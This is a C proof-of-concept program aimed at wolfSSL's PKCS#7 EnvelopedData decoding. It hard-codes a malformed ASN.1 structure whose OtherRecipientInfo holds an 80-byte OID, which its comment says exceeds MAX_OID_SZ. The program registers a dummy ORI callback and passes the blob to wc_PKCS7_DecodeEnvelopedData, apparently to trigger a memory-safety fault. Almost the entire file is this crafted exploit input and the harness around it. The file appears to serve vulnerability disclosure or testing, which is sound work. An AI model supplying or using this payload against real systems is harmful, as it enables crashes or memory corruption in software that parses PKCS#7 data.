#include <stdio.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/wolfcrypt/pkcs7.h>
#include <wolfssl/wolfcrypt/error-crypt.h>

static int dummy_ori_decrypt_cb(wc_PKCS7* pkcs7,
    byte* oriType, word32 oriTypeSz,
    byte* oriValue, word32 oriValueSz,
    byte* decryptedKey, word32* decryptedKeySz,
    void* ctx)
{
    (void)pkcs7;
    (void)oriType;
    (void)oriTypeSz;
    (void)oriValue;
    (void)oriValueSz;
    (void)decryptedKey;
    (void)decryptedKeySz;
    (void)ctx;

    fprintf(stderr, "[*] dummy ORI decrypt callback reached\n");
    return -1;
}

int main(void)
{
    wc_PKCS7* p7 = NULL;
    byte out[256];
    int ret;

    /*
     * EnvelopedData with [4] IMPLICIT ORI containing an 80-byte OID.
     * The OID is encoded as: 06 50 2a 41 41 ...
     * 0x50 == 80 bytes, which exceeds MAX_OID_SZ.
     */
    static const byte poc[] = {
        0x30, 0x6b,
          0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x03,
          0xa0, 0x5e,
            0x30, 0x5c,
              0x02, 0x01, 0x00,
              0x31, 0x57,
                0xa4, 0x55,
                  0x06, 0x50,
                    0x2a,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                  0x04, 0x01, 0x00
    };

    memset(out, 0, sizeof(out));

    fprintf(stderr, "[*] creating PKCS7 object\n");
    p7 = wc_PKCS7_New(NULL, INVALID_DEVID);
    if (p7 == NULL) {
        fprintf(stderr, "[-] wc_PKCS7_New failed\n");
        return 2;
    }

    fprintf(stderr, "[*] registering ORI decrypt callback\n");
    wc_PKCS7_SetOriDecryptCb(p7, dummy_ori_decrypt_cb);

    fprintf(stderr, "[*] input size: %u\n", (unsigned)sizeof(poc));
    fprintf(stderr, "[*] calling wc_PKCS7_DecodeEnvelopedData\n");

    ret = wc_PKCS7_DecodeEnvelopedData(p7, (byte*)poc, (word32)sizeof(poc),
                                       out, (word32)sizeof(out));

    fprintf(stderr, "[*] wc_PKCS7_DecodeEnvelopedData returned: %d\n", ret);

    wc_PKCS7_Free(p7);

    return 0;
}
